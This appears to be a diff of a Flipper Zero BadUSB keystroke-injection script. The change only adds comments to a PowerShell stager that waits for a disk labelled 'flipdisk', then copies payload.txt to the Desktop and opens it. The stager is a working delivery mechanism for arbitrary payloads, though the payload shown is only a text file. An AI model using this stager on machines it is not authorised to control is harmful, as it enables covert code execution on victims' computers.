@@ -22,6 +22,9 @@ DELAY 750
 REM $d is the powershell command to run once the flipper disk image is found
 STRING $d={$Desktoppath=[environment]::getfolderpath("desktop"); cp $driveLetter\payload.txt $desktoppath\payload.txt;invoke-item $desktoppath\payload.txt;};
 
+REM below is the powershell stager to look for a disk label called 'flipdisk'. 
+REM Powershell will remain open and wait until it sees the disk mount.
+REM Once disk is found, command $d from above is executed.
 STRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange;do{$newEvent = Wait-Event -SourceIdentifier volumeChange;$eventType = $newEvent.SourceEventArgs.NewEvent.EventType;if ($eventType -eq 2){$driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName;$driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName;if ($driveLabel -eq 'flipdisk'){start-sleep -seconds 1;& $d;exit;}};Remove-Event -SourceIdentifier volumeChange;} while (1-eq1);Unregister-Event -SourceIdentifier volumeChange
 
 ENTER
